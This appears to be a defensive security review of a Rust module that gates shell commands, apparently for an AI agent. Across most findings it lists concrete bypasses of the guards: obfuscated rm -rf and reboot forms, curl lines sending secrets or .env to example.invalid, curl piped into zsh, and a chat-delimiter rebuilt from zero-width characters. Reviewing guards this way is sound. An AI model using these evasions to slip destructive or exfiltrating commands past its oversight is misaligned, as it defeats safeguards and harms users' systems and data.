# Lane: security
## Scope
- `src/security/normalize.rs`: 1,045 LOC, read in full.
- `src/security/tirith.rs`: 444 LOC, read in full.
- `src/security/dangerous.rs`: 380 LOC, read in full.
- `src/security/scan.rs`: 213 LOC, read in full.
- `src/security/hardline.rs`: 189 LOC, read in full.
- `src/security/neutralize.rs`: 133 LOC, read in full.
- `src/security/approval_display.rs`: 83 LOC, read in full.
- `src/security/mod.rs`: 246 LOC, read in full.
- Total: 2,733 LOC, including tests. Terminal call-site context was read only to understand the distinction between unconditional rejection and approval; no findings target that file.

## Findings
### [P0] Safe-argument masking erases executable command substitutions
- Location: src/security/normalize.rs:687
- Evidence: `spans.push((segment_at + tok.start, segment_at + tok.end));`
- Why it matters: At the public classifier boundary, `echo "$(rm -rf /)"` and `grep "$(rm -rf /)" log` lose the entire substituted argument. The echo branch masks every non-option argument, and the grep branch likewise masks its pattern without checking whether it executes substitutions. The resulting detection variant contains no `rm`; the inner command word is already plain `rm`, so word deobfuscation does not add an unmasked variant, and execution-flag detection finds no interpreter flag. Both classifiers miss the deletion even though a shell evaluates it before echo/grep. Backtick substitutions in echo arguments have the same problem. An enclosing, separately classified `sh -c` can expose the raw payload and recover detection; this finding is specifically about the classifiers' direct script-input contract.
- Suggested fix: Mask only statically inert argument text. Preserve and recursively inspect executable `$()` and backtick nodes before replacing surrounding argument content; use actual quote state rather than the unused `inert_single_quoted` heuristic.

### [P0] Verification cleanup exemption accepts executable shell syntax
- Location: src/security/dangerous.rs:333
- Evidence:
  ```rust
    if is_verification_artifact_cleanup(command) {
        return None;
    }
  ```
- Why it matters: `rm -f /tmp/hermes-verify-$(chmod${IFS}777${IFS}file)` is exactly three whitespace-separated strings. Its target passes the temporary-directory and filename-prefix checks, so detection returns before normalization. A shell executes the chmod substitution, while hardline has no rule for this permission change. The exception also accepts traversal components rather than proving the target is a verification artifact. This is a full exemption based on string appearance, not a checked single-file operation.
- Suggested fix: Restrict this exception to a parsed, literal three-element argv with no expansions, operators, or traversal, and validate the actual target directory and filename. Never exempt an entire shell script based on a filename prefix.

### [P0] Quoted flags evade dangerous-command argument matching
- Location: src/security/dangerous.rs:23
- Evidence:
  ```rust
        (r"\brm\s+(-[^\s]*\s+)*/", "delete in root path"),
        (r"\brm\s+-[^\s]*r", "recursive delete"),
        (r"\brm\s+--recursive\b", "recursive delete (long flag)"),
  ```
- Why it matters: `rm '-rf' workdir` and `rm "-rf" workdir` execute recursive deletion but match none of these rules. Normalization removes empty quotes only, and the deobfuscation variants transform command words, not their flag arguments. The fallback does not classify rm as an interpreter. The same underlying gap permits `chmod '777' file`. For hardline device redirection, `printf x > '/dev/sda'` loses unconditional rejection even though the dangerous matcher can still request approval.
- Suggested fix: Match decoded argv tokens and parsed redirection targets, preserving expansion information separately. Quoting an ordinary literal flag must not change its classification.

### [P0] Dynamic executable names and ANSI-C escapes fail open
- Location: src/security/normalize.rs:112
- Evidence: `let stripped_escapes = BACKSLASH_ESCAPE_RE.replace_all(&rewritten_home, "$1");`
- Why it matters: `tool=rm; $tool -rf /etc` leaves the executable unresolved and matches neither classifier. Bash `$'\162\155' -rf /etc` also executes rm, but this normalization converts the octal escapes into the literal digits `162155`; subsequent quote removal produces `$162155`, not rm. Neither unresolved command words nor unsupported shell expansions generate a conservative finding. Benign shell expansion probes confirmed the ANSI-C expression expands to `rm`, without executing it.
- Suggested fix: Decode supported shell literal syntax with a shell-aware parser. Return an explicit unresolved-executable risk, rather than a clean result, when a command name depends on variables or unsupported expansions; do not evaluate attacker-supplied expansions during classification.

### [P0] Hardline command-position matching misses paths, wrappers, and control-flow bodies
- Location: src/security/hardline.rs:23
- Evidence: `let cmdpos = r"(?:^|[\n`]|[$]\()\s*(?:sudo\s+(?:-[^\s]+\s+)*)?(?:env\s+(?:\w+=\S*\s+)*)?(?:(?:exec|nohup|setsid|time)\s+)*\s*";`
- Why it matters: `/bin/rm -rf /etc` is not hardline because the regex expects bare rm. `/sbin/reboot`, `command reboot`, `env -S reboot`, and `if true; then reboot; fi` evade the shutdown hardline; these shutdown forms also lack a dangerous-command fallback. Marking separators does not remove `then`, resolve executable basenames, or consume env options. Redirection-prefixed command positions are likewise absent. These are valid ways of invoking the same prohibited command, not malformed input.
- Suggested fix: Apply hardline rules to executable nodes from the shared shell parser, resolve the executable basename, consume supported wrappers/options, and visit control-flow bodies. Fail closed when a command position cannot be interpreted.

### [P0] Hardline rm inspects only the first operand
- Location: src/security/hardline.rs:24
- Evidence: `let rm_prefix = format!(r"{cmdpos}rm\s+(-[^\s]*\s+)*");`
- Why it matters: `rm -rf /tmp/unused /etc` does not match any hardline rm rule because the protected path must follow the flag prefix immediately. The harmless first operand prevents recognition of the later system-directory deletion. Dangerous detection still sees recursive rm, but an unconditional prohibition has been downgraded to an approvable action.
- Suggested fix: Parse flags separately and inspect every rm operand against hardline targets, including operands following `--` and platform-supported reordered flags.

### [P0] Lexical path matching permits aliases of protected directories and files
- Location: src/security/hardline.rs:25
- Evidence: `let hardline_system_dirs = r"/home|/home/\*|/root|/root/\*|/etc|/etc/\*|/usr|/usr/\*|/var|/var/\*|/bin|/bin/\*|/sbin|/sbin/\*|/boot|/boot/\*|/lib|/lib/\*|/System|/System/\*";`
- Why it matters: `rm -rf /etc/` and `rm -rf /./etc` address /etc but evade hardline matching; the path tail does not admit the trailing slash and no component normalization occurs. The analogous dangerous write rules miss `printf hi > /./etc/hosts` and `cp data /./etc/hosts`, which address the same system file as /etc/hosts. Home rewriting only searches prefixes ending in a slash, so a bare absolute HOME value is not converted to `~` either. No symlink race is needed for these examples.
- Suggested fix: Normalize literal path components and trailing separators before comparing protected targets. Supply execution cwd/home context for relative and home paths, and conservatively gate unresolved path expressions; do not rely on replacing path substrings inside the entire command string.

### [P0] systemctl hardline can be bypassed with ordinary global options
- Location: src/security/hardline.rs:80
- Evidence: `format!(r"{cmdpos}systemctl\s+(poweroff|reboot|halt|kexec)\b"),`
- Why it matters: `systemctl --no-wall reboot` and `systemctl --no-wall poweroff` execute the same prohibited lifecycle action but fail the immediate-subcommand regex. The dangerous systemctl rule covers stop/restart/disable/mask, not reboot/poweroff, so it does not compensate. This bypass needs neither encoding nor executable-name obfuscation.
- Suggested fix: Parse systemctl global options and match the resolved subcommand against the hardline action set regardless of option position.

### [P0] Sudo stdin guard examines only one unquoted spelling and option position
- Location: src/security/hardline.rs:15
- Evidence: `LazyLock::new(|| Regex::new(r"(?i)(?:^|[;&|`\n]|&&|\|\||[$]\()\s*sudo\s+-S\b").unwrap());`
- Why it matters: With SUDO_PASSWORD absent, `/usr/bin/sudo -S id`, `env sudo -S id`, `'sudo' -S id`, `sudo -n -S id`, and combined `sudo -nS id` evade this guard. It checks only `normalize_command_for_detection`, not the deobfuscated variants or parsed sudo options. Some forms still receive dangerous approval, but password-guessing prevention is no longer unconditional; `sudo -n -S id` also evades the dangerous sudo regexes described below.
- Suggested fix: Run the stdin guard on parsed sudo invocations, resolve executable paths/wrappers, and recognize `S` in any valid option position or short-option cluster. Keep the existing SUDO_PASSWORD policy decision separate from syntax recognition.

### [P0] Raw regex character classes exclude the letter n instead of newline
- Location: src/security/dangerous.rs:252
- Evidence: `r"\bgit\s+branch\b[^;|&\\n]*?(?:-d\b|--delete\b)[^;|&\\n]*?(?:-f\b|--force\b)",`
- Why it matters: In a Rust raw string, `[^;|&\\n]` excludes a literal backslash and the letter n; it does not exclude newline. `git branch --delete branchname --force` therefore misses the force-delete rules because the branch name contains n. The two sudo patterns repeat the same mistake: `sudo -n -S id` cannot scan past the n option to find S, and misses both dangerous and hardline stdin checks. Conversely, the class can consume newlines that appear intended as boundaries.
- Suggested fix: Use `[^;|&\n]` in the raw regex strings where newline exclusion is intended, and add machine-behavior cases containing literal n and actual newline. Parsed option matching should eventually replace these fragile scans.

### [P0] Destructive CLI rules assume fixed subcommand and flag ordering
- Location: src/security/dangerous.rs:235
- Evidence: `r"\bgit\s+reset\s+--h(?:a(?:r(?:d)?)?)?\b",`
- Why it matters: `git -C repo reset --hard` and `git reset HEAD --hard` evade all dangerous patterns despite performing a hard reset. Related failures are `docker --context production stop app`, `systemctl --host production stop nginx`, and, on GNU rm, `rm workdir -rf`. Neither normalization nor the interpreter fallback identifies these executable-specific argument forms. They are ordinary CLI syntax, not unsupported shell language.
- Suggested fix: Identify each executable/subcommand from argv, consume options with their values, and test destructive flags throughout the legal option region rather than matching one textual ordering.

### [P0] Equivalent world-writable chmod modes are not recognized
- Location: src/security/dangerous.rs:41
- Evidence: `r"\bchmod\s+(-[^\s]*\s+)*(777|666|o\+[rwx]*w|a\+[rwx]*w)\b",`
- Why it matters: `chmod 0777 file`, `chmod o+wx file`, and `chmod a=rw file` all grant other/world write access but match no dangerous rule. The numeric alternatives omit a leading zero and other write-bearing modes; the symbolic expression requires w to be the last word character, so the valid wx ordering fails. This bypass is independent of quoting.
- Suggested fix: Parse numeric permission bits and symbolic chmod clauses, then check whether the operation enables other-write. Do not enumerate only two octal strings or require one permission-letter order.

### [P0] Interpreter flag parsing misses valid execution forms
- Location: src/security/normalize.rs:893
- Evidence: `if args[i].starts_with("-c") {`
- Why it matters: Python `-Ic` is a valid combined option, but is not recognized as code execution; `python3 -W ignore -c PAYLOAD` stops scanning at the option value ignore. Perl `-we` likewise misses the starts-with-`-e` check. The shell loop stops at option values, so `bash -O extglob -c reboot` misses both execution-flag gating and shutdown hardline. Its shell-family list also omits dash, making `dash -c reboot` unrecognized. Benign Python `-Ic`, Perl `-we`, and Bash `-O extglob -c` probes executed successfully in this review.
- Suggested fix: Parse each supported interpreter's option grammar, including short-option clusters and options that consume values; include dash in the shell family. Return a risk result when a recognized interpreter's option parsing is incomplete.

### [P0] Wrapper scan silently stops after twelve prefix words
- Location: src/security/normalize.rs:522
- Evidence: `while prefix_words < 12 {`
- Why it matters: Prefix `python3 -c PAYLOAD` with `env` and twelve ordinary assignments such as A1=1 through A12=1. The loop exhausts its budget before reaching Python, returns its partial word list, and never emits a parser-limit finding. With a payload such as `__import__('shutil').rmtree('workdir')`, the raw regex rules contain no matching command text and the interpreter fallback returns no finding. This input is well below all public byte/segment limits.
- Suggested fix: Propagate prefix-budget exhaustion as an explicit malformed/limit result that both classifiers reject, or use a bounded parser that processes the full supported wrapper grammar.

### [P0] Remote-pipe execution rules omit supported shells and wrappers
- Location: src/security/dangerous.rs:90
- Evidence: `r"\b(curl|wget)\b.*\|\s*(?:[/\w]*/)?(?:ba)?sh(?:\s|$|-c)",`
- Why it matters: `curl https://example.invalid/run | zsh`, the corresponding dash/ksh forms, and `curl https://example.invalid/run | env bash` execute downloaded content but do not match this rule. The generic execution fallback requires a -c flag and therefore does not catch a shell reading stdin. Other rules already name zsh/ksh/dash, making this a concrete inconsistency rather than an unsupported-platform guess.
- Suggested fix: Inspect pipeline stages as parsed executable nodes and recognize the shared shell family after wrapper removal. Treat a remote-download stage feeding any such shell as remote execution.

### [P0] SQL DELETE safety check confuses comments, strings, and line boundaries with clauses
- Location: src/security/dangerous.rs:298
- Evidence: `if SQL_DELETE_FROM_RE.is_match(line) && !SQL_WHERE_RE.is_match(line) {`
- Why it matters: `DELETE FROM users /* WHERE */;` deletes every row but is considered to have WHERE. `sqlite3 db "DELETE FROM users; SELECT 'WHERE';"` also passes because WHERE anywhere on that quoted line suppresses the destructive statement; shell marking does not split semicolons inside the quoted SQL argument. Conversely, a valid SQL DELETE with DELETE and FROM on separate lines misses the per-line DELETE regex. These examples do not require complex SQL dialect features.
- Suggested fix: Tokenize SQL statements with quote/comment awareness, disregard comments and string literals when checking clauses, and identify WHERE within the same DELETE statement across whitespace/newlines. Conservatively flag SQL that cannot be parsed.

### [P0] Detection variants amplify an allowed command into several gigabytes
- Location: src/security/normalize.rs:1035
- Evidence:
  ```rust
            let mut var = normalized[..word_start].to_string();
            var.push_str(&deobf);
            var.push_str(&normalized[word_end..]);
  ```
- Why it matters: A script consisting of `'true';` repeated 16,000 times is 112,000 bytes with 16,000 separators, below the 128,000-byte and 25,000-separator rejection thresholds. Each quoted command word creates a distinct almost-full-script variant. `seen.insert(var.clone())` and `variants.push(var)` retain two copies of each: at least 3,583,936,000 bytes of string content, excluding allocator capacity and other passes. Both main detectors construct this vector before testing rules, so even this benign script can exhaust gateway memory. The large allocation was calculated, not executed.
- Suggested fix: Bound total variant count and total retained bytes and fail closed on exhaustion. Prefer inspecting parsed command nodes or streaming bounded candidates instead of making a whole-command copy per word.

### [P0] User deny globs are matched against whole scripts rather than executable commands
- Location: src/security/hardline.rs:181
- Evidence:
  ```rust
        let candidate = variant.trim();
        for pattern in &globs {
            if wildcard_match(pattern, candidate) {
  ```
- Why it matters: With deny rule `npm publish *`, both `true; npm publish --access public` and `env npm publish --access public` fail to match. The variants add newline markers but do not yield a standalone, wrapper-free `npm publish ...` candidate, and wildcard matching is anchored to the entire string. The same deny rule succeeds on the unprefixed command. This permits trivial evasion of a user-configured unconditional deny.
- Suggested fix: Match deny rules against every parsed executable command, including nested payloads and wrapper-stripped argv, while retaining any intentionally supported whole-script rules.

### [P1] Wildcard matching allocates and computes the full length-product matrix
- Location: src/security/hardline.rs:146
- Evidence: `let mut dp = vec![vec![false; t_len + 1]; p_len + 1];`
- Why it matters: Every pattern/candidate pair costs O(pattern length * command length) memory and CPU before a match is returned. A 1,024-character configured rule and a 120,000-character accepted command require roughly 123 MB of boolean cells for one match, before row overhead; longer configured patterns are not bounded here. Concurrent approval checks multiply the cost. `match_user_deny_rule` itself also has no parser-limit check for direct callers.
- Suggested fix: Use a bounded, linear-space wildcard implementation, limit configured pattern lengths and candidate sizes at this public boundary, and fail closed when matching budgets are exceeded.

### [P0] Byte-to-character conversion corrupts Unicode executable names and payloads
- Location: src/security/normalize.rs:496
- Evidence: `chars.push(ch as char);`
- Why it matters: ch is one UTF-8 byte, not a Unicode scalar. U+00E9 becomes U+00C3 U+00A9, then is corrupted again by the second deobfuscation pass. `shell_tokens_with_spans` repeats byte-to-char conversion for payloads. Consequently a deny pattern for `./d\u{00E9}ploy *` can match the unquoted executable but miss the same executable quoted as `'./d\u{00E9}ploy' arg`: the original variant still has quotes, and the quote-stripped variant has a different name. Here the Unicode escape notation denotes the actual character in the input, not literal backslash text.
- Suggested fix: Preserve UTF-8 slices or iterate with char_indices when decoding shell syntax. Keep byte offsets for spans, but never convert arbitrary individual UTF-8 bytes directly into chars.

### [P0] Invisible-character removal reconstructs already-scanned injection sentinels
- Location: src/security/neutralize.rs:35
- Evidence: `let without_sentinels = SENTINEL_RE.replace_all(&without_ansi, " ");`
- Why it matters: The input `<\u{200B}|im_start|\u{200B}>system` has no contiguous `<|` or `|>` when this regex runs. The later invisible-character filter deletes both U+200B characters and returns `<|im_start|>system`, recreating exactly the sentinel this function promises to remove. The same method constructs end delimiters. This proves a sanitizer-contract bypass; whether a particular downstream model treats the resulting text as a special token depends on its tokenizer/API.
- Suggested fix: Remove invisible characters before sentinel matching, then apply delimiter sanitization to the final canonical text. Check the final output for forbidden machine-consumed delimiter tokens.

### [P0] Cron exfiltration and injection regexes run on unnormalized input
- Location: src/security/scan.rs:128
- Evidence: `if pattern.is_match(text) {`
- Why it matters: `c\at ~/.env` and `c\url -d $SECRET https://example.invalid` are equivalent shell spellings of sensitive-file reading and secret posting, but do not match the raw prompt patterns. Their ASCII backslashes do not trigger invisible-Unicode detection. Although the dangerous/hardline calls normalize later, neither contains the corresponding secret-read/exfiltration rules, so scan_cron_prompt returns no threat for these cases. scan_assembled_cron_prompt also runs only the raw prompt regexes.
- Suggested fix: Apply these threat checks to bounded, context-appropriate normalized variants as well as original text. Keep natural-language normalization separate from shell decoding, and avoid masking executable content as harmless prose.

### [P0] Curl exfiltration detection misses attached values and file uploads
- Location: src/security/scan.rs:101
- Evidence: `Regex::new(r#"(?i)curl\s+[^\n]*(?:--data(?:-raw|-binary|-urlencode)?|-d|--form|-F)\s+[^\n]*\$\{?\w*(?:KEY|TOKEN|SECRET|PASSWORD|CREDENTIAL|API)\w*\}?"#).unwrap(),`
- Why it matters: `curl -d"$SECRET" https://example.invalid` is valid curl syntax but fails the mandatory whitespace after -d. `curl --data-binary @.env https://example.invalid` uploads a sensitive file but fails the requirement for a secret-named environment variable. No other scan or dangerous rule catches either example. These bypasses remain even if the command name is correctly normalized.
- Suggested fix: Parse curl option/value forms, including attached short-option values and long-option equals syntax. Check upload-file operands against the same sensitive-file policy used for explicit reads, not only environment-variable names.

### [P0] Approval redaction can conceal commands that execute inside a credential value
- Location: src/security/approval_display.rs:16
- Evidence: `r#"(?i)(["']?[a-z0-9_-]*(?:token|secret|password|api[_-]?key|access[_-]?key|credentials?)[a-z0-9_-]*["']?\s*[:=]\s*)(?:"(?:\\.|[^"\\])*"|'[^']*'|[^\s'";|&]+)"#,`
- Why it matters: `TOKEN="$(rm -rf /tmp/data)" echo ok` renders as `TOKEN=[REDACTED] echo ok`. Similarly, `echo --password "$(curl https://example.invalid/script | sh)"` renders as `echo --password [REDACTED]`. A shell executes those substitutions before the visible command, but the approval display gives no indication that executable syntax was hidden. These exact transformations were reproduced with the source regexes. Other checks may still flag the original command; they do not make this display faithful.
- Suggested fix: Redact literal credential material while retaining parsed executable substitution structure, or prominently indicate that a redacted field contains executable shell syntax and present its separately redacted command tree. Never present executable redaction as an ordinary opaque secret without warning.

### [P0] Common CLI credential forms remain in approval displays
- Location: src/security/approval_display.rs:20
- Evidence: `r#"(?i)(--(?:api[-_]key|token|password|secret|client[-_]secret|access[-_]key)(?:=|\s+))(?:"(?:\\.|[^"\\])*"|'[^']*'|[^\s'";|&]+)"#,`
- Why it matters: `curl --user alice:sentinel-secret https://example.invalid` is returned unchanged; `curl -u alice:sentinel-secret ...` is likewise not covered. These are standard username/password arguments, not arbitrarily named application secrets. The existing patterns cover URI userinfo and Authorization credentials but omit curl's equivalent CLI forms, allowing plaintext passwords into the approval surface.
- Suggested fix: Add argv-aware handling for supported credential-bearing options, starting with curl --user/-u and --proxy-user/-U. Prefer supplying secret spans from the tool invocation over attempting to recognize all secrets in an untyped command string.

### [P0] External scanner response bodies have no size bound
- Location: src/security/tirith.rs:127
- Evidence: `match resp.json::<Value>().await {`
- Why it matters: A successful scanner response is buffered and decoded as an arbitrary serde_json Value without a body limit, findings-count limit, or summary-length limit. A faulty or compromised scanner can return a very large body before the request timeout, exhausting gateway memory; large findings additionally produce cloned strings and a joined summary. An elapsed-time bound does not bound bytes from a fast peer. This is a reachable external-response allocation path, not a claim that the configured scanner was attacked during review.
- Suggested fix: Read at most a configured number of response bytes before JSON decoding, enforce bounded response fields, and route oversize responses through the configured failure policy. Do not rely solely on Content-Length or request duration.

### [P1] Scanner client construction silently discards timeout configuration on failure
- Location: src/security/tirith.rs:39
- Evidence: `.unwrap_or_else(|_| reqwest::Client::new()),`
- Why it matters: If construction of the configured client fails, the error is discarded and a default client is substituted without applying timeout. scan_command has no independent timeout wrapper and never consults self.timeout again, so this fallback can wait indefinitely for a nonresponsive peer instead of producing the configured fail-open/fail-closed verdict. This is a conditional source-level failure path; a client-construction failure was not induced in this review.
- Suggested fix: Make construction return a Result and report the original error, or store an unavailable-scanner state evaluated by the same failure policy. Enforce the request deadline independently if fallback construction remains supported.

### [P2] The function named NFKC implements only a fullwidth-ASCII mapping
- Location: src/security/normalize.rs:67
- Evidence: `other => out.push(other),`
- Why it matters: normalize_unicode_nfkc leaves compatibility characters such as U+212A KELVIN SIGN and U+FB01 LATIN SMALL LIGATURE FI unchanged, although true NFKC maps them to K and fi. Its name overstates the normalization contract, making it unsafe for callers to assume compatibility normalization has occurred. This is a naming/coverage defect; no claim is made that an ordinary shell executes a Unicode lookalike as the ASCII command.
- Suggested fix: Use a real Unicode normalization implementation if NFKC is required, or rename the function to describe its explicitly limited fullwidth-ASCII mapping and document the limitation.

### [P0] Parameter-replacement regex excludes variable names containing s
- Location: src/security/normalize.rs:21
- Evidence: `LazyLock::new(|| Regex::new(r"\$\{[^}/\\s]+/[^}/]*/(?P<replacement>[^}]*)\}").unwrap());`
- Why it matters: The raw character class `[^}/\\s]` excludes a literal backslash and the letter s, rather than whitespace. In Bash, `s=foo; ${s/foo/rm} -rf /etc` invokes rm, but the intended simple-replacement deobfuscation never recognizes the expansion because its variable name is s. None of the resulting variants contains a recognizable rm invocation. The corresponding expansion with a variable name not containing s can take the implemented replacement path.
- Suggested fix: Correct the raw class to `[^}/\s]` if whitespace exclusion is intended, and handle unresolved replacements as explicit risks. Add equivalent cases with and without s in the variable name so the parser contract cannot silently diverge.

### [P1] Command-word deobfuscation reintroduces text that safe-argument masking removed
- Location: src/security/normalize.rs:1037
- Evidence: `var.push_str(&normalized[word_end..]);`
- Why it matters: `echo 'rm -rf /'` is intentionally treated as harmless by masking its inert argument, but `'echo' 'rm -rf /'` generates an additional variant from normalized rather than grep_safe. That variant is `echo 'rm -rf /'` with the argument no longer masked, and the dangerous regex matches rm inside the printed literal. Quoting grep's executable produces the same inconsistency. This causes spurious approval requirements for semantically identical benign invocations.
- Suggested fix: Apply inert-argument masking consistently after each command-word transformation, or perform both operations on one parsed representation. Preserve executable substitutions as described in the separate masking finding.

## Strengths
- The two primary detectors explicitly reject oversized scripts before normal classification; hardline also rejects malformed grep/echo tokenization rather than treating it as safe.
- Patterns use Rust's regex engine with lazily compiled, static expressions. The review found no catastrophic-backtracking mechanism in this engine; the serious resource risks are variant generation, wildcard DP, and response allocation instead.
- Tirith distinguishes explicit allow from warning/error paths, checks HTTP status, and follows an explicit fail-open/fail-closed setting for network, JSON, and schema errors. Its async tests subscribe to shutdown signals and use bounded awaits rather than fixed sleeps.
- Approval redaction preserves URI host/path information for recognized userinfo credentials and propagates regex initialization errors rather than displaying unredacted data on that error path.

## Notes
- This was a read-only source review. No product files, tests, dependency files, or git state were changed; no destructive payload was executed. The only authored file is this report.
- Structural scans covered unwrap/expect/panic/unreachable, filesystem/thread/blocking calls, TODO/FIXME/HACK, awaits, locks, channels, collections, formatting, and ignored-error patterns. No production lock-across-await, lock-order cycle, blocking filesystem call in an async function, SQL query construction, retry loop, or scheduler time arithmetic was present in the target. Most unwraps are fixed regex initialization or tests; no independent reachable UTF-8 slicing panic was proven.
- Findings concern the security-module functions and their returned classification/display text. A particular gateway route can add protection through its outer shell serialization, execution-root restrictions, approval policy, or external scanner. A direct-script false negative is not automatically proof of end-to-end execution through every tool. Hardline-to-approval downgrades are explicitly distinguished from entirely unclassified inputs above.
- Proof method: full source/control-flow tracing, then in-memory Python extraction of all 70 dangerous regexes and all 13 hardline regexes for short ASCII counterexamples and manually traced variants. Redaction and sentinel transformations were similarly checked. These checks corroborate the cited source behavior; they are not represented as compiled Rust tests. No cargo command was run because build/test artifacts would violate the one-file write boundary.
- Benign real-shell/interpreter probes confirmed ANSI-C and printf octal expansion, Python -Ic, Perl -we, and Bash option-with-value handling. A proposed attached Node -e form was rejected by the installed Node runtime and was dropped. Standard ANSI CSI stripping also behaved correctly in the check and was not reported as broken.
- The multi-gigabyte allocation example is an arithmetic lower bound from source, not a stress test. The scanner-construction fallback is conditional and was not forced. Platform-specific CLI examples are labeled where relevant; interpreter or executable availability remains an execution-environment prerequisite.
- The assembled cron scanner intentionally has a smaller rule set than the raw scanner, and Tirith tests intentionally map server deny/reject to an approvable Block rather than the internal Deny variant. Without a stronger policy contract these choices are not counted as additional bugs. Neutralizing delimiter syntax is also not proof that arbitrary natural-language prompt injection has been eliminated.
- Source tracing plus bounded benign probes was chosen over a new Rust harness: it verifies concrete transformations without modifying product code or creating artifacts outside the single permitted report path. The main recommendation is parsed, bounded command/argv inspection with explicit unresolved states, rather than continually adding regex spellings; the repeated failures arise from differences between shell syntax and raw command text.
